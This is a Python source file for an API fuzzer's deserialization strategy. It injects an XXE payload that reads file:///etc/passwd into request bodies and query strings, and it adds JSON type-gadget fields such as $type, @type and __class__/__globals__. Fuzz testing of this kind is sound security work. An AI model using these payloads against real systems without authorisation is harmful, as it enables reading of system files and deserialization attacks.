from __future__ import annotations

from typing import Any
from typing import Iterator

from rsfuzzer.mutations.strategies.base import _merge_body
from rsfuzzer.mutations.types import MutationTrace

_XXE_SNIPPET = (
    "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><r>&xxe;</r>"
)

_JSON_GADGETS: tuple[dict[str, Any], ...] = (
    {"$type": "System.Object"},
    {"@type": "java.lang.Object"},
    {"__class__": {"__init__": {"__globals__": {}}}},
    {"$ref": "#/definitions/x"},
)


class DeserializationStrategy:
    """XXE-shaped XML strings and type-metadata JSON fields for unsafe deserialization probes."""

    id = "deserialization_xxe"
    category = "deserialization"

    def __init__(self, *, light: bool = False) -> None:
        self._light = light

    def mutate_body(
        self,
        body: dict[str, Any] | None,
    ) -> Iterator[tuple[dict[str, Any], MutationTrace]]:
        base = dict(body) if body else {}
        merged = _merge_body(base, {"_xml": _XXE_SNIPPET})
        yield merged, MutationTrace(self.id, self.category, {"shape": "xxe_doctype_entity"})
        if not self._light:
            merged2 = _merge_body(base, {"data": _XXE_SNIPPET})
            yield merged2, MutationTrace(self.id, self.category, {"shape": "xxe_in_data_field"})
        gadgets = _JSON_GADGETS[:2] if self._light else _JSON_GADGETS
        for g in gadgets:
            yield _merge_body(base, g), MutationTrace(
                self.id,
                self.category,
                {"shape": "json_type_metadata", "keys": list(g.keys())},
            )

    def mutate_query(
        self,
        query: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        q = dict(query)
        q["_xml"] = _XXE_SNIPPET[:200]
        yield q, MutationTrace(self.id, self.category, {"shape": "xxe_query_truncated"})

    def mutate_headers(
        self,
        headers: dict[str, str],
    ) -> Iterator[tuple[dict[str, str], MutationTrace]]:
        h = dict(headers)
        h["Content-Type"] = "application/xml"
        h["X-Requested-With"] = "XMLHttpRequest"
        trace = MutationTrace(self.id, self.category, {"content_type": "application/xml"})
        yield h, trace
